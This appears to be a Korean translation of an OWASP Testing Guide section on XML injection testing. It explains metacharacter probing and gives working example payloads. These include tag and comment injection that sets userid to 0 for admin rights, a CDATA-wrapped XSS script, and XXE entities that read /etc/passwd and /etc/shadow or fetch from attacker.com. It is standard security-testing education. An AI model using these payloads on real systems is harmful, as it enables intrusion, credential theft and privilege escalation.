============================================================================================
OTG-INPVAL-008
============================================================================================

|

XML 인젝션 테스트

|

개요
============================================================================================

XML 인젝션 테스트는 침투 테스터가 어플리케이션에 XML 문서를 삽입하려 할 때 입니다.
만약 XML 파서가 문맥 데이터를 검증하는데 실패하면, 테스트가 긍정적인 결과를 산출할 것입니다.
이 섹션은 XML 삽입의 실제 사례를 설명합니다.
우선 XML 스타일의 통신을 정의하고, 그 동작 원리를 설명합니다.
그런 다음, XML 메타 문자를 삽입하는 검색 방법에 대해 설명합니다.
첫번째 단계가 수행되면, 침투 테스터는 XML 구조에 대한 정보를 가지고, 
XML 데이터 및 태그를 인젝션 시도하는 것이 가능할 것입니다

|

테스트 방법
============================================================================================

아래 처럼 사용자 등록을 수행하기 위해 XML 스타일 통신을 사용하는 
웹 어플리케이션이 있다고 가정합니다.
계정이 생성이 되면, xmlDb 파일에 <user> 노드가 새로 추가됩니다.

.. code-block:: xml

    <?xml version=”1.0” encoding=”ISO-8859-1”?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
    </users>


예를 들어, 다음 값이 있습니다.

.. code-block:: xml

    Username: tony
    Password: Un6R34kb!e
    E-mail: s4tan@hell.com

요청을 진행합니다.

.. code-block:: console

    http://www.example.com/addUser.php?
    username=tony&
    password=Un6R34kb!e&
    email=s4tan@hell.com

어플리케이션에서는 다음 노드가 빌드됩니다.

.. code-block:: xml

    <user> 
        <username>tony</username> 
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user>

다음 xmlDB에 추가될 것입니다.

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users> 
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user> 
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail> 
        </user> 
    </users> 

|

취약점 존재 확인
-------------------------------------------------------------------------------------------

어플리케이션에 XML 삽입 취약점이 존재하는지 테스트하기 위해 XML 메타 문자를 삽입하는 부분을 
확인합니다.

**XML metacharacters**

- 싱글 쿼트: ' 

필터링하지 않을 경우, 인젝션된 값이 태그의 속성 값의 일부가 될 것입니다. XML 파싱 동안 예외가 발생될 수 있습니다.

예를 들어 다음과 같은 속성이 있다고 가정합니다.

.. code-block:: xml

    <node attrib='$inputValue'/>

그래서 만약 아래와 같이 삽입되면 다음과 같이 속성 값이 삽입됩니다.

.. code-block:: xml

    inputValue = foo'

    <node attrib='foo''/> 


|

- 더블 쿼트: " 

이 문자도 싱글 쿼트와 같으며, 속성 값이 더블 쿼트로 묶여 있는 경우 사용될 수 있습니다.

.. code-block:: xml

    <node attrib="$inputValue"/> 

그래서 만약 아래와 같이 삽입되면 다음과 같이 속성 값이 삽입됩니다.

.. code-block:: xml

    $inputValue = foo" 

    <node attrib="foo""/> 


|

- 부등 기호: >, < 

다음과 같이 입력 부분에 개방 또는 폐쇄 괄호를 추가합니다.

.. code-block:: xml

    Username = foo< 

어플리케이션에 다음과 같이 빌드됩니다.

.. code-block:: xml

    <user> 
        <username>foo<</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user> 

|

- 주석 태그: <!--/--> 

해당 문자열은 주석의 시작과 종료로 해석됩니다. 

.. code-block:: xml

    Username = foo<!-

어플리케이션에서 다음과 같이 입력되게 됩니다.

.. code-block:: xml

    <user> 
        <username>foo<!--</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user> 

|

- 앰퍼센드: & 

앰퍼센드는 엔티티를 표현하기 위한 XML 구문으로 사용됩니다. 
엔티티의 형식은 '&symbol;' 입니다.
앤티티는 유니 코드 문자 집합의 문자에 매핑된다.

[예제]

.. code-block:: xml
    
    <tagnode>&lt;</tagnode> 

위 문자는 '<' 로 표현됩니다.

만약 '&' 가 &amp; 로 자체 인코딩되지 않아, XML 인젝션을 테스트하는 데 사용됩니다. 

사실상, 만약 입력이 다음과 같다면 새로운 노드가 아래와 같이 생성될 것입니다.

.. code-block:: xml

    Username = &foo 


.. code-block:: xml

    <user> 
        <username>&foo</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid> 
        <mail>s4tan@hell.com</mail> 
    </user> 

|

- CDATA section delimiters: <![CDATA[ / ]]> 

CDATA 섹션은 마크업으로 인식될 수 있는 문자를 포함하는 텍스트 영역을 빠져나가는데 사용됩니다.
즉, CDATA 섹션에 둘러싸인 문자는 XML 파서에 의해 해석되지 않습니다.

예를 들어, 만약 텍스트 노드에 '<foo>' 문자를 표현해야 한다면, CDATA 섹션을 사용하면 됩니다.

.. code-block:: xml

    <node>
        <![CDATA[<foo>]]> 
    </node>

위의 '<foo>' 문자열은 파싱되지 않고 표현될 것입니다.

만약 노드가 다음 방법으로 빌드되어 있다면, 태스터는 

.. code-block:: xml

    <username><![CDATA[<$userName]]></username> 

CDATA 문자열 끝에 ']]>' 문자열을 삽입할 수 있습니다.

.. code-block:: xml

    userName = ]]> 

this will become: 

.. code-block:: xml

    <username><![CDATA[]]>]]></username> 

CDATA 태그와 관련해서 또 다른 예제로 HTML 페이지를 생성할 수 있는 
XML 문서라고 가정해봅시다.

이 경우에는, CDATA 섹션이 필터링 목록에 없을 경우 CDATA를 통해 우회할 수 있습니다.
아래 구체적인 예를 살펴봅시다.

.. code-block:: xml

    <html>
        $HTMLCode
    </html> 

공격자는 다음과 같은 입력을 제공할 수 있습니다.

.. code-block:: xml

    $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>
    alert('xss')<![CDATA[<]]>/script<![CDATA[>]]> 

그리고 다음 코드를 포함합니다.

.. code-block:: xml

    <html>
        <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/ script<![CDATA[>]]> 
    </html> 

아래와 같이 CDATA 섹션은 제거되고, 다음 HTML 코드가 생성되게 됩니다.

.. code-block:: xml

    <script>alert('XSS')</script> 

결과적으로 XSS 취약점이 발생하게 됩니다.


**External Entity:**

유효한 엔티티의 집합은 새로운 엔티티를 정의하여 확장될 수 있습니다. 
만약 엔티티의 정의가 URI 라면, 엔티티는 외부 엔티티라고 합니다.
다른 구성이 없는 한, 외부 엔티티가 URI(로컬 머신 또는 원격 시스템 파일)에 의해 
지정된 리소스에 강제 접근합니다.
이 동작은 XML 외부 엔티티(XXE) 공격에 노출됩니다.

XXE 취약점을 테스트하기 위해서는 다음 입력을 사용할 수 있습니다. 

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ 
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file://dev/random" >]><foo>&xxe;
    </foo> 

이 테스트에서 만약 XML 파서가 /dev/random 파일 목록으로 엔티티를 대체하려고 하면,
웹 서버가 종료될 수도 있습니다.

또 다른 유용한 테스트 방법입니다.

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file://etc/passwd" >]><foo>&xxe;</foo>
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file://etc/shadow" >]><foo>&xxe;</foo>
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file://c:/boot.ini" >]><foo>&xxe;</foo>
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo> 

|

태그 인젝션
-------------------------------------------------------------------------------------------

첫번째 단계가 수행되면, 테스터는 XML 문서의 구조에 대한 정보를 얻을 것입니다.
그리고나서, XML 데이터와 태그를 삽입할 수가 있습니다.
아래에서 권한 상승 공격이 발생할 수 있는 방법을 예제로 보여줄 것입니다.

아래와 같이 이메일에 xml 태그 값을 입력합니다.

.. code-block:: xml

    Username: tony 
    Password: Un6R34kb!e 
    E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com 

어플리케이션은 새로운 노드를 빌드하고 XML 데이터베이스에 그것을 추가할 것입니다.

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users> 
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user> 
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com</mail> 
        </user>
    </users> 

우리가 삽입한 사용자는 userid 태그에 0을 부여하여 관리자 권한을 획득하였습니다.

XML 문서가 다음 DTD에 의해 지정되었다고 가정합니다.

.. code-block:: xml

    <!DOCTYPE users [
        <!ELEMENT users (user+) >
        <!ELEMENT user (username,password,userid,mail+) >
        <!ELEMENT username (#PCDATA) >
        <!ELEMENT password (#PCDATA) >
        <!ELEMENT userid (#PCDATA) >
        <!ELEMENT mail (#PCDATA) > 
    ]> 

userid 노드가 cardinality 1으로 정의되어 있는 걸 체크합니다.
이 경우에는, 모든 처리가 발생하기 전에 XML 문서가 DTD에 대해 검증되는 경우, 
위 공격 방식은 동작하지 않습니다.

그러나, 테스터가 잘못된 노드 앞 일부 노드 값을 제어할 경우 문제는 해결될 수 있습니다.
사실상, 테스터는 주석의 시작과 종료를 주입하여 노드들을 주석처리 할 수 있습니다.

.. code-block:: xml

    Username: tony 
    Password: Un6R34kb!e</password><!--
    E-mail: --><userid>0</userid><mail>s4tan@hell.com 


.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password> 
            <userid>500</userid> 
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user> 
            <username>tony</username> 
            <password>Un6R34kb!e</password><!--</password> 
            <userid>500</userid> 
            <mail>--><userid>0</userid><mail>s4tan@hell.com</mail> 
        </user> 
    </users> 


|

Tools 
============================================================================================

- XML Injection Fuzz Strings (from wfuzz tool): https://github.com/xmendez/wfuzz

|

References 
============================================================================================

Whitepapers
------------------------------------------------------------------------------------------

- Alex Stamos: "Attacking Web Services": http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt 
- Gregory Steuck, "XXE (Xml eXternal Entity) attack": http://www.securityfocus.com/archive/1/297714 

|